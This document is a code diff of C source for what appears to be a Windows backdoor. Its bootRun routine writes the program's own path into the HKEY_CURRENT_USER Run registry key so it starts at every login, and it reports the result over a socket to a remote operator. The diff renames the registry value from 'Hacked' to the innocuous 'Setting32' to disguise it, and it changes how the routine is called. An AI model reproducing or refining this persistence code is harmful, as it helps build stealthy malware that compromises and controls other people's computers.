@@ -9,7 +9,6 @@
 #include <string.h>
 #include <sys/stat.h>
 #include <sys/types.h>
-#include <pthread.h>
 
 
 #define bzero(p, size) (void) memset((p), 0, (size))
@@ -17,7 +16,7 @@
 int sock;
 
 
-int bootRun()
+void* bootRun(void *vargp)
 {
 	char err[128] = "Failed\n";
 	char suc[128] = "Created Persistence At : HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\n";
@@ -27,24 +26,24 @@ int bootRun()
 	pathLen = GetModuleFileName(NULL, szPath, MAX_PATH);
 	if (pathLen == 0) {
 		send(sock, err, sizeof(err), 0);
-		return -1;
+		return NULL;
 	}
 
 	HKEY NewVal;
 
 	if (RegOpenKey(HKEY_CURRENT_USER, TEXT("Software\\Microsoft\\Windows\\CurrentVersion\\Run"), &NewVal) != ERROR_SUCCESS) {
 		send(sock, err, sizeof(err), 0);
-		return -1;
+		return NULL;
 	}
 	DWORD pathLenInBytes = pathLen * sizeof(*szPath);
-	if (RegSetValueEx(NewVal, TEXT("Hacked"), 0, REG_SZ, (LPBYTE)szPath, pathLenInBytes) != ERROR_SUCCESS) {
+	if (RegSetValueEx(NewVal, TEXT("Setting32"), 0, REG_SZ, (LPBYTE)szPath, pathLenInBytes) != ERROR_SUCCESS) {
 		RegCloseKey(NewVal);
 		send(sock, err, sizeof(err), 0);
-		return -1;
+		return NULL;
 	}
 	RegCloseKey(NewVal);
 	send(sock, suc, sizeof(suc), 0);
-	return 0;
+	return NULL;
 }
 
 
@@ -75,7 +74,7 @@ str_cut(char str[], int slice_from, int slice_to)
                         return NULL;
                 buffer_len = slice_to - slice_from;
                 str += slice_from;
-
+	
         } else
                 return NULL;
 
@@ -140,8 +139,7 @@ int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrev, LPSTR lpCmdLine, int 
 		exit(1);
 	}
 
-	pthread_t thread_id;
-	pthread_create(&thread_id, NULL, bootRun, NULL);
+	bootRun(NULL);
 
 	sock = socket(AF_INET, SOCK_STREAM, 0);
 
